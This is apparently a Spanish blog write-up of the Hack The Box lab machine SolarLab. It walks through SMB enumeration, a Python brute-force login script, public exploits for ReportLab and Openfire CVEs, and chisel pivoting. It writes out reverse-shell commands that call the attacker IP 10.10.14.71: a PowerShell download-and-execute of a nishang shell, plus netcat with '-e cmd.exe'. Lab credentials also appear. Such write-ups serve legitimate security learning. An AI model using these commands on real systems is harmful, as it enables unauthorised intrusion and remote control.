@@ -1,0 +1,442 @@
+<!doctype html>
+<html lang="es-ES"><head><script src="/livereload.js?mindelay=10&amp;v=2&amp;port=1313&amp;path=livereload" data-no-instant defer></script>
+    <title>Bajo el teclado</title>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+    <meta name="description" content="" />
+
+    
+    
+    
+    <link rel="stylesheet" href="../../css/theme.min.css">
+
+    
+    
+    
+
+    
+  
+
+
+</head>
+<body>
+        <div id="content" class="mx-auto"><header class="container mt-sm-5 mt-4 mb-4 mt-xs-1">
+    <div class="row">
+        
+        <div class="col-sm-4 col-12 text-sm-right text-center pt-sm-4">
+            <a href="../../" class="text-decoration-none">
+                <img id="home-image" class="rounded-circle"
+                    
+                        
+                            src="../../pointed.png"
+                        
+                    
+                />
+            </a>
+        </div>
+        <div class="col-sm-8 col-12 text-sm-left text-center">
+        
+            <h2 class="m-0 mb-2 mt-4">
+                <a href="../../" class="text-decoration-none">
+                    
+                        pointedsec
+                    
+                </a>
+            </h2>
+            <p class="text-muted mb-1">
+                
+                    if pentester.found == bug { make(pentester,states.happy) }
+                
+            </p>
+            <ul id="nav-links" class="list-inline mb-2">
+                
+                
+                    <li class="list-inline-item">
+                        <a class="badge badge-white " href="../../" title="Home">/Home</a>
+                    </li>
+                
+                    <li class="list-inline-item">
+                        <a class="badge badge-white " href="../../about/" title="About">About</a>
+                    </li>
+                
+                    <li class="list-inline-item">
+                        <a class="badge badge-white " href="../../writeups/" title="Write-Up&#39;s">Write-Up&#39;s</a>
+                    </li>
+                
+            </ul>
+            <ul id="nav-social" class="list-inline">
+                
+                    <li class="list-inline-item mr-3">
+                        <a href="http://github.com/pointedsec" target="_blank">
+                            <i class="fab fa-github fa-1x text-muted"></i>
+                        </a>
+                    </li>
+                
+                    <li class="list-inline-item mr-3">
+                        <a href="https://www.linkedin.com/in/andr%C3%A9s-del-cerro-rodr%C3%ADguez-13a826293/" target="_blank">
+                            <i class="fab fa-linkedin-in fa-1x text-muted"></i>
+                        </a>
+                    </li>
+                
+                    <li class="list-inline-item mr-3">
+                        <a href="mailto:adelcerrorodriguez@gmail.com" target="_blank">
+                            <i class="fas fa-at fa-1x text-muted"></i>
+                        </a>
+                    </li>
+                
+                    <li class="list-inline-item mr-3">
+                        <a href="https://pointedsec.vercel.app" target="_blank">
+                            <i class="fas fa-globe fa-1x text-muted"></i>
+                        </a>
+                    </li>
+                
+                    <li class="list-inline-item mr-3">
+                        <a href="https://app.hackthebox.com/profile/1575364" target="_blank">
+                            <i class="fas fa-box fa-1x text-muted"></i>
+                        </a>
+                    </li>
+                
+            </ul>
+        </div>
+    </div>
+    <hr />
+</header>
+<div class="container">
+    <div class="pl-sm-4 ml-sm-5">
+        <h1 id="enumeration">Enumeration</h1>
+<h2 id="tcp-scan">TCP Scan</h2>
+<p>Primero descubrimos que puertos por TCP están abiertos utilizando <code>rustscan</code></p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>➜  scan rustscan -a 10.129.231.39 --ulimit <span style="color:#ae81ff">5000</span> -g
+</span></span><span style="display:flex;"><span>10.129.231.39 -&gt; <span style="color:#f92672">[</span>80,135,139,445,6791,7680<span style="color:#f92672">]</span>
+</span></span></code></pre></div><p>Y ahora hacemos un escaneo mas exhaustivo sobre estos puertos con <code>nmap</code></p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>➜  scan nmap -p80,135,139,445,6791,7680 -sCV 10.129.231.39 -oN allPorts
+</span></span><span style="display:flex;"><span>Starting Nmap 7.94SVN <span style="color:#f92672">(</span> https://nmap.org <span style="color:#f92672">)</span> at 2024-07-27 14:28 CEST
+</span></span><span style="display:flex;"><span>Nmap scan report <span style="color:#66d9ef">for</span> 10.129.231.39
+</span></span><span style="display:flex;"><span>Host is up <span style="color:#f92672">(</span>0.036s latency<span style="color:#f92672">)</span>.
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>PORT     STATE SERVICE       VERSION
+</span></span><span style="display:flex;"><span>80/tcp   open  http          nginx 1.24.0
+</span></span><span style="display:flex;"><span>|_http-title: Did not follow redirect to http://solarlab.htb/
+</span></span><span style="display:flex;"><span>|_http-server-header: nginx/1.24.0
+</span></span><span style="display:flex;"><span>135/tcp  open  msrpc         Microsoft Windows RPC
+</span></span><span style="display:flex;"><span>139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
+</span></span><span style="display:flex;"><span>445/tcp  open  microsoft-ds?
+</span></span><span style="display:flex;"><span>6791/tcp open  http          nginx 1.24.0
+</span></span><span style="display:flex;"><span>|_http-server-header: nginx/1.24.0
+</span></span><span style="display:flex;"><span>|_http-title: Did not follow redirect to http://report.solarlab.htb:6791/
+</span></span><span style="display:flex;"><span>7680/tcp open  pando-pub?
+</span></span><span style="display:flex;"><span>Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>Host script results:
+</span></span><span style="display:flex;"><span>| smb2-time:
+</span></span><span style="display:flex;"><span>|   date: 2024-07-27T12:29:44
+</span></span><span style="display:flex;"><span>|_  start_date: N/A
+</span></span><span style="display:flex;"><span>|_clock-skew: 14s
+</span></span><span style="display:flex;"><span>| smb2-security-mode:
+</span></span><span style="display:flex;"><span>|   3:1:1:
+</span></span><span style="display:flex;"><span>|_    Message signing enabled but not required
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+</span></span><span style="display:flex;"><span>Nmap <span style="color:#66d9ef">done</span>: <span style="color:#ae81ff">1</span> IP address <span style="color:#f92672">(</span><span style="color:#ae81ff">1</span> host up<span style="color:#f92672">)</span> scanned in 83.61 seconds
+</span></span></code></pre></div><p>De estos escaneos sabemos sabemos dos cosas.
+Que quizás se estén compartiendo recursos compartidos mediante SMB que sean críticos ya sea utilizando una null session o con credenciales.</p>
+<p>Y sabemos que por los redireccionamientos, se está aplicando virtual hosting y descubrimos dos subdominios</p>
+<ul>
+<li>solarlab.htb</li>
+<li>report.solarlab.htb</li>
+</ul>
+<p>Vamos a añadir estos subdominios al <code>/etc/hosts</code></p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>➜  content echo <span style="color:#e6db74">&#34;10.129.231.39  report.solarlab.htb solarlab.htb&#34;</span> | sudo tee -a /etc/hosts
+</span></span><span style="display:flex;"><span>10.129.231.39  report.solarlab.htb solarlab.htb
+</span></span></code></pre></div><p>Enumerando el SMB, podemos hacer uso de una null session y con <code>smbmap</code> detectamos que tenemos acceso de lectura a un recurso compartido a nivel de red llamado <code>Documents</code></p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>content smbmap -H solarlab.htb -u null
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> IP: 10.129.231.39:445	Name: solarlab.htb        	Status: Authenticated
+</span></span><span style="display:flex;"><span>	Disk                                                  	Permissions	Comment
+</span></span><span style="display:flex;"><span>	----                                                  	-----------	-------
+</span></span><span style="display:flex;"><span>	ADMIN$                                            	NO ACCESS	Remote Admin
+</span></span><span style="display:flex;"><span>	C$                                                	NO ACCESS	Default share
+</span></span><span style="display:flex;"><span>	Documents                                         	READ ONLY	
+</span></span><span style="display:flex;"><span>	IPC$                                              	READ ONLY	Remote IPC
+</span></span></code></pre></div><p>En el documento <code>old_leave_request_form.docx</code>, viendo los metadatos, podemos ver un nombre de usuario: <strong>Jackie</strong> y <strong>Alison Melville</strong></p>
+<p>En el documento <code>Training-Request-Form.docx</code> detectamos otros nombres de usuario: <strong>Gayle.Rennie</strong> y <strong>FRYATT, Susanne</strong></p>
+<p>En el documento <code>Travel-Request-Sample.docx</code>
+detectamos otros nombres de usuario:
+<strong>Paul Squillace</strong> y <strong>Katy Brown</strong></p>
+<p>En el documento <code>details-file.xlsx</code>
+encontramos varios usuarios y contraseñas</p>
+<p>Con esto nos podemos montar un diccionario de usuario y contraseñas fácilmente.</p>
+<h1 id="ganando-acceso-al-reporthub">Ganando acceso al ReportHub</h1>
+<p>Ahora que tenemos varios usuarios y contraseñas podemos probar a iniciar sesión en este panel.
+El problema es que no está el protocolo de Kerberos habilitado (por ejemplo) para poder comprobar que usuarios existen a nivel de sistema y poder sacar conclusiones mas fácilmente.
+<img src="images/SolarLab_2.png" alt="Write-up Image">
+Después de probar los usuarios, los usuarios <code>AlexanderK</code> y <code>ClaudiaS</code> producen errores distintos, por lo cual esta es una forma de enumerar usuarios.
+<img src="images/SolarLab_3.png" alt="Write-up Image"></p>
+<p>He hecho un pequeño script para hacer un ataque por diccionario probando todos los usuarios y contraseñas obtenidos y también haciendo algunas combinaciones</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#75715e">#!/usr/bin/python3</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> requests
+</span></span><span style="display:flex;"><span><span style="color:#f92672">from</span> pwn <span style="color:#f92672">import</span> <span style="color:#f92672">*</span>
+</span></span><span style="display:flex;"><span>LOGIN_ENDPOINT<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;http://report.solarlab.htb:6791/login&#34;</span>
+</span></span><span style="display:flex;"><span>USERFILE<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;/home/kali/Desktop/solarlab/content/users.txt&#34;</span>
+</span></span><span style="display:flex;"><span>PASSFILE<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;/home/kali/Desktop/solarlab/content/passwords.txt&#34;</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">brute</span>():
+</span></span><span style="display:flex;"><span>    log<span style="color:#f92672">.</span>progress(<span style="color:#e6db74">&#39;Bruteforcing &#39;</span>, LOGIN_ENDPOINT)
+</span></span><span style="display:flex;"><span>    s <span style="color:#f92672">=</span> requests<span style="color:#f92672">.</span>Session()
+</span></span><span style="display:flex;"><span>    s<span style="color:#f92672">.</span>get(LOGIN_ENDPOINT)
+</span></span><span style="display:flex;"><span>    p <span style="color:#f92672">=</span> log<span style="color:#f92672">.</span>progress(<span style="color:#e6db74">&#39;Bruteforcing...&#39;</span>)
+</span></span><span style="display:flex;"><span>    p<span style="color:#f92672">.</span>status(<span style="color:#e6db74">&#39;Trying:&#39;</span>)
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">for</span> user <span style="color:#f92672">in</span> open(USERFILE, <span style="color:#e6db74">&#39;r&#39;</span>):
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">for</span> pwd <span style="color:#f92672">in</span> open(PASSFILE, <span style="color:#e6db74">&#39;r&#39;</span>):
+</span></span><span style="display:flex;"><span>            p<span style="color:#f92672">.</span>status(<span style="color:#e6db74">&#34;Trying </span><span style="color:#e6db74">{0}</span><span style="color:#e6db74">:</span><span style="color:#e6db74">{1}</span><span style="color:#e6db74">&#34;</span><span style="color:#f92672">.</span>format(user<span style="color:#f92672">.</span>strip(), pwd<span style="color:#f92672">.</span>strip()))
+</span></span><span style="display:flex;"><span>            data <span style="color:#f92672">=</span> {<span style="color:#e6db74">&#39;username&#39;</span>: user<span style="color:#f92672">.</span>strip(), <span style="color:#e6db74">&#39;password&#39;</span>: pwd<span style="color:#f92672">.</span>strip()}
+</span></span><span style="display:flex;"><span>            headers <span style="color:#f92672">=</span> {<span style="color:#e6db74">&#39;Content-Type&#39;</span>: <span style="color:#e6db74">&#39;application/x-www-form-urlencoded&#39;</span>}
+</span></span><span style="display:flex;"><span>            r <span style="color:#f92672">=</span> s<span style="color:#f92672">.</span>post(LOGIN_ENDPOINT, data <span style="color:#f92672">=</span> data, headers <span style="color:#f92672">=</span> headers)
+</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">if</span> r<span style="color:#f92672">.</span>headers<span style="color:#f92672">.</span>get(<span style="color:#e6db74">&#39;Content-Length&#39;</span>) <span style="color:#f92672">!=</span> <span style="color:#e6db74">&#39;2144&#39;</span> <span style="color:#f92672">and</span> r<span style="color:#f92672">.</span>headers<span style="color:#f92672">.</span>get(<span style="color:#e6db74">&#39;Content-Length&#39;</span>) <span style="color:#f92672">!=</span> <span style="color:#e6db74">&#39;2133&#39;</span>:
+</span></span><span style="display:flex;"><span>                log<span style="color:#f92672">.</span>success(<span style="color:#e6db74">&#34;Got a hit! &#34;</span> <span style="color:#f92672">+</span> user<span style="color:#f92672">.</span>strip() <span style="color:#f92672">+</span> <span style="color:#e6db74">&#34;:&#34;</span> <span style="color:#f92672">+</span> pwd<span style="color:#f92672">.</span>strip())
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">if</span> __name__ <span style="color:#f92672">==</span> <span style="color:#e6db74">&#34;__main__&#34;</span>:
+</span></span><span style="display:flex;"><span>    brute()
+</span></span></code></pre></div><p>Y conseguimos unas credenciales válidas!</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>➜  content python3 brute.py
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>▖<span style="color:#f92672">]</span> Bruteforcing : http://report.solarlab.htb:6791/login
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>d<span style="color:#f92672">]</span> Bruteforcing...: Trying Katy.Brown:dadsfawe9dafkn
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Got a hit! BlakeB:ThisCanB3typedeasily1@
+</span></span></code></pre></div><h1 id="foothold">Foothold</h1>
+<p>Antes de explorar el sitio web, me interesa saber si este sitio es un CMS reconocido y tiene vulnerabilidades encontradas.
+<img src="images/SolarLab_4.png" alt="Write-up Image"></p>
+<p>Y parece que tiene un RCE asociado.
+<a href="https://github.com/L41KAA/CVE-2023-33733-Exploit-PoC">CVE-2023-33733</a></p>
+<p>Parece que se acontece una inyección de comandos a la hora de añadir un párrafo en cualquier funcionalidad
+<img src="images/SolarLab_5.png" alt="Write-up Image"></p>
+<p>Voy a intentar mandándome un ping</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>➜  CVE-2023-33733-Exploit-PoC git:<span style="color:#f92672">(</span>main<span style="color:#f92672">)</span> python3 exp.py --host <span style="color:#e6db74">&#39;report.solarlab.htb&#39;</span> --port <span style="color:#ae81ff">6791</span> --username <span style="color:#e6db74">&#39;BlakeB&#39;</span> --password <span style="color:#e6db74">&#39;ThisCanB3typedeasily1@&#39;</span> --cmd <span style="color:#e6db74">&#39;ping 10.10.14.71&#39;</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Logging in to http://report.solarlab.htb:6791/login
+</span></span><span style="display:flex;"><span>Retreived session cookie: session<span style="color:#f92672">=</span>.eJwljjsOw0AIBe9CnQLWfBZfxjJrUNLacRXl7lkp0715zXxgqzOvJ6zv884HbK8DVoh9aC48GnM5YYjsncJHVsrwEUi1OLt1iXlL10RPw0NSbBIh3lpG2WLUVSPUHaf25hyszCqCJuqhDa2a78GEpKlzlxwwQ-4rz38NwfcHgZgttg.ZqU7AA.XHsnPDC8phcG6BMnDvLQbf2lGYM; HttpOnly; Path<span style="color:#f92672">=</span>/
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Extracting session token...
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Token extracted:  .eJwljjsOw0AIBe9CnQLWfBZfxjJrUNLacRXl7lkp0715zXxgqzOvJ6zv884HbK8DVoh9aC48GnM5YYjsncJHVsrwEUi1OLt1iXlL10RPw0NSbBIh3lpG2WLUVSPUHaf25hyszCqCJuqhDa2a78GEpKlzlxwwQ-4rz38NwfcHgZgttg.ZqU7AA.XHsnPDC8phcG6BMnDvLQbf2lGYM
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Building Exploit...
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Exploit built
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Preparing request
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Sending request to http://report.solarlab.htb:6791/leaveRequest
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Sending a reverse shell should cause request to hang
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Request sent
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Probable success. Status Code <span style="color:#ae81ff">500</span>
+</span></span></code></pre></div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>➜  ~ sudo tcpdump -i tun0 icmp
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>sudo<span style="color:#f92672">]</span> password <span style="color:#66d9ef">for</span> kali:
+</span></span><span style="display:flex;"><span>tcpdump: verbose output suppressed, use -v<span style="color:#f92672">[</span>v<span style="color:#f92672">]</span>... <span style="color:#66d9ef">for</span> full protocol decode
+</span></span><span style="display:flex;"><span>listening on tun0, link-type RAW <span style="color:#f92672">(</span>Raw IP<span style="color:#f92672">)</span>, snapshot length <span style="color:#ae81ff">262144</span> bytes
+</span></span><span style="display:flex;"><span>20:22:41.575007 IP report.solarlab.htb &gt; 10.10.14.71: ICMP echo request, id 1, seq 1, length <span style="color:#ae81ff">40</span>
+</span></span><span style="display:flex;"><span>20:22:41.575163 IP 10.10.14.71 &gt; report.solarlab.htb: ICMP echo reply, id 1, seq 1, length <span style="color:#ae81ff">40</span>
+</span></span><span style="display:flex;"><span>20:22:42.579868 IP report.solarlab.htb &gt; 10.10.14.71: ICMP echo request, id 1, seq 2, length <span style="color:#ae81ff">40</span>
+</span></span><span style="display:flex;"><span>20:22:42.579885 IP 10.10.14.71 &gt; report.solarlab.htb: ICMP echo reply, id 1, seq 2, length <span style="color:#ae81ff">40</span>
+</span></span><span style="display:flex;"><span>20:22:43.586730 IP report.solarlab.htb &gt; 10.10.14.71: ICMP echo request, id 1, seq 3, length <span style="color:#ae81ff">40</span>
+</span></span><span style="display:flex;"><span>20:22:43.586749 IP 10.10.14.71 &gt; report.solarlab.htb: ICMP echo reply, id 1, seq 3, length <span style="color:#ae81ff">40</span>
+</span></span><span style="display:flex;"><span>20:22:44.593617 IP report.solarlab.htb &gt; 10.10.14.71: ICMP echo request, id 1, seq 4, length <span style="color:#ae81ff">40</span>
+</span></span><span style="display:flex;"><span>20:22:44.593634 IP 10.10.14.71 &gt; report.solarlab.htb: ICMP echo reply, id 1, seq 4, length <span style="color:#ae81ff">40</span>
+</span></span></code></pre></div><p>Perfecto, ahora con <code>nishang</code> voy a mandarme una RevShell</p>
+<p>Nos montamos un servidor web con python y compartimos la típica Reverse Shell de nishang, <code>Invoke-PowerShellTcp.ps1</code></p>
+<p>Y con <code>powershell.exe -c iex (iwr http://10.10.14.71/Invoke-PowerShellTcp.ps1)</code> nos mandamos la revshell.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-powershell" data-lang="powershell"><span style="display:flex;"><span>PS C:\Users\blake\Documents\app&gt;whoami
+</span></span><span style="display:flex;"><span>solarlab\blake
+</span></span></code></pre></div><h1 id="consiguiendo-mas-credenciales">Consiguiendo mas credenciales</h1>
+<p>En la ruta <code>C:\Users\blake\Documents\app\instance</code> encontramos un archivo <code>users.db</code> que contiene credenciales para otros usuarios</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-powershell" data-lang="powershell"><span style="display:flex;"><span>PS C:\Users\blake\DOcuments\app\instance&gt; type users.db
+</span></span><span style="display:flex;"><span>SQLite format <span style="color:#ae81ff">3</span>@  .j?
+</span></span><span style="display:flex;"><span>?!!??+<span style="color:#66d9ef">?</span>9tableuseruserCREATE TABLE user (
+</span></span><span style="display:flex;"><span>	id INTEGER NOT NULL,
+</span></span><span style="display:flex;"><span>	username VARCHAR(<span style="color:#ae81ff">50</span>) NOT NULL,
+</span></span><span style="display:flex;"><span>	password VARCHAR(<span style="color:#ae81ff">100</span>) NOT NULL,
+</span></span><span style="display:flex;"><span>	PRIMARY KEY (id),
+</span></span><span style="display:flex;"><span>	UNIQUE (username)
+</span></span><span style="display:flex;"><span>)<span style="color:#e6db74">&#39;;indexsqlite_autoindex_user_1user
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">????!)alexanderkHotP!fireguard&#39;</span>claudias007poiuytrewq 9blakebThisCanB3typedeasily1@
+</span></span><span style="display:flex;"><span>????!alexanderk
+</span></span><span style="display:flex;"><span>               claudias		blakeb
+</span></span></code></pre></div><p>Sin embargo, no vemos que existan estos usuarios a nivel de sistema.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-powershell" data-lang="powershell"><span style="display:flex;"><span>PS C:\Users&gt; dir
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    Directory<span style="color:#960050;background-color:#1e0010">:</span> C:\Users
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>Mode                 LastWriteTime         Length Name
+</span></span><span style="display:flex;"><span>----                 -------------         ------ ----
+</span></span><span style="display:flex;"><span>d-----        <span style="color:#ae81ff">11</span>/<span style="color:#ae81ff">17</span>/<span style="color:#ae81ff">2023</span>  <span style="color:#ae81ff">10</span><span style="color:#960050;background-color:#1e0010">:</span><span style="color:#ae81ff">03</span> AM                Administrator
+</span></span><span style="display:flex;"><span>d-----        <span style="color:#ae81ff">11</span>/<span style="color:#ae81ff">16</span>/<span style="color:#ae81ff">2023</span>   <span style="color:#ae81ff">9</span><span style="color:#960050;background-color:#1e0010">:</span><span style="color:#ae81ff">43</span> PM                blake
+</span></span><span style="display:flex;"><span>d-----        <span style="color:#ae81ff">11</span>/<span style="color:#ae81ff">17</span>/<span style="color:#ae81ff">2023</span>   <span style="color:#ae81ff">2</span><span style="color:#960050;background-color:#1e0010">:</span><span style="color:#ae81ff">13</span> PM                openfire
+</span></span><span style="display:flex;"><span>d-r---        <span style="color:#ae81ff">11</span>/<span style="color:#ae81ff">17</span>/<span style="color:#ae81ff">2023</span>  <span style="color:#ae81ff">12</span><span style="color:#960050;background-color:#1e0010">:</span><span style="color:#ae81ff">54</span> PM                Public
+</span></span></code></pre></div><p>Pero las contraseñas nos podrían servir mas adelante.
+También me llama un poco la atención ese directorio personal de trabajo <code>openfire</code> , ya que es un servicio común que quizás nos pueda servir ara escalar privilegios.</p>
+<p>De hecho, encontramos vulnerabilidades asociadas a este servicio. Encontramos un Authentication Bypass y un RCE.
+<a href="https://github.com/tangxiaofeng7/CVE-2023-32315-Openfire-Bypass">CVE-2023-32315</a></p>
+<h1 id="pivoting-a-openfire">Pivoting a <code>openfire</code></h1>
+<p>Este servicio utiliza por defecto el puerto 9090.
+<img src="images/SolarLab_6.png" alt="Write-up Image"></p>
+<p>En la máquina víctima podemos ver que está abierto
+<img src="images/SolarLab_7.png" alt="Write-up Image"></p>
+<p>Ahora con chisel hacemos un reverse port forwarding.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>➜  ~ /usr/share/chisel server --reverse -p <span style="color:#ae81ff">1234</span>
+</span></span></code></pre></div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-powershell" data-lang="powershell"><span style="display:flex;"><span>PS C:\Windows\Temp\work&gt; .\chisel client <span style="color:#ae81ff">10.10</span>.14.<span style="color:#ae81ff">71</span><span style="color:#960050;background-color:#1e0010">:</span><span style="color:#ae81ff">1234</span> R:<span style="color:#ae81ff">9090</span><span style="color:#960050;background-color:#1e0010">:</span><span style="color:#ae81ff">127.0</span>.0.<span style="color:#ae81ff">1</span><span style="color:#960050;background-color:#1e0010">:</span><span style="color:#ae81ff">9090</span>
+</span></span></code></pre></div><p>Al final utilicé este <a href="https://github.com/miko550/CVE-2023-32315">RCE</a>
+Primero creamos el usuario.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>➜  CVE-2023-32315 git:<span style="color:#f92672">(</span>main<span style="color:#f92672">)</span> python3 CVE-2023-32315.py -t http://127.0.0.1:9090
+</span></span><span style="display:flex;"><span>....
+</span></span><span style="display:flex;"><span>User added successfully: url: http://127.0.0.1:9090 username: l7be2x password: 3puzku
+</span></span></code></pre></div><p><img src="images/SolarLab_1.png" alt="Write-up Image"></p>
+<p>Ya hemos ganado acceso al panel, ahora en principio, se debe de acontecer una vulnerabilidad de tipo RCE para poder ganar acceso al sistema como el usuario <code>openfire</code></p>
+<p><img src="images/SolarLab_8.png" alt="Write-up Image"></p>
+<p>Aquí podemos inyectar un archivo <code>.jar</code> malicioso y conseguir ejecución de comandos.
+Voy a subir el <code>.jar</code> que viene en el PoC</p>
+<p>Y ahora en esta ruta
+<code>http://127.0.0.1:9090/plugins/openfire-management-tool-plugin/cmd.jsp</code></p>
+<p>Tenemos una webshell.
+Ahora primero nos descargamos nc desde la webshell.
+<code>powershell.exe &quot;iwr http://10.10.14.71/nc.exe -o nc.exe&quot;</code></p>
+<p>Y ahora nos mandamos una cmd <code>nc.exe 10.10.14.71 443 -e cmd.exe</code></p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-cmd" data-lang="cmd"><span style="display:flex;"><span>C:\Program<span style="color:#75715e"> Files\Openfire\bin&gt;whoami</span>
+</span></span><span style="display:flex;"><span>whoami
+</span></span><span style="display:flex;"><span>solarlab\openfire
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>C:\Program<span style="color:#75715e"> Files\Openfire\bin&gt;</span>
+</span></span></code></pre></div><p>Enumerando un poco los archivos de openfire, nos damos cuenta de un directorio un tanto peculiar.
+<code>07/27/2024  08:29 PM    &lt;DIR&gt;          embedded-db</code></p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-cmd" data-lang="cmd"><span style="display:flex;"><span>C:\Program<span style="color:#75715e"> Files\Openfire\embedded-db&gt;dir</span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">dir</span>
+</span></span><span style="display:flex;"><span> Volume in drive C has no label.
+</span></span><span style="display:flex;"><span> Volume Serial Number is 385E-AC57
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span> Directory of C:\Program Files\Openfire\embedded-db
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>07/27/2024  08:29 PM    &lt;DIR&gt;          .
+</span></span><span style="display:flex;"><span>07/27/2024  08:29 PM    &lt;DIR&gt;          ..
+</span></span><span style="display:flex;"><span>07/27/2024  08:29 PM                 0 openfire.lck
+</span></span><span style="display:flex;"><span>07/27/2024  09:40 PM             1,188 openfire.log
+</span></span><span style="display:flex;"><span>07/27/2024  08:29 PM               106 openfire.properties
+</span></span><span style="display:flex;"><span>05/07/2024  09:53 PM            16,161 openfire.script
+</span></span><span style="display:flex;"><span>07/27/2024  08:29 PM    &lt;DIR&gt;          openfire.tmp
+</span></span><span style="display:flex;"><span>               4 File(s)         17,455 bytes
+</span></span><span style="display:flex;"><span>               3 Dir(s)   7,777,484,800 bytes free
+</span></span></code></pre></div><p>En el fichero <code>openfire.script</code> encontramos esta linea.</p>
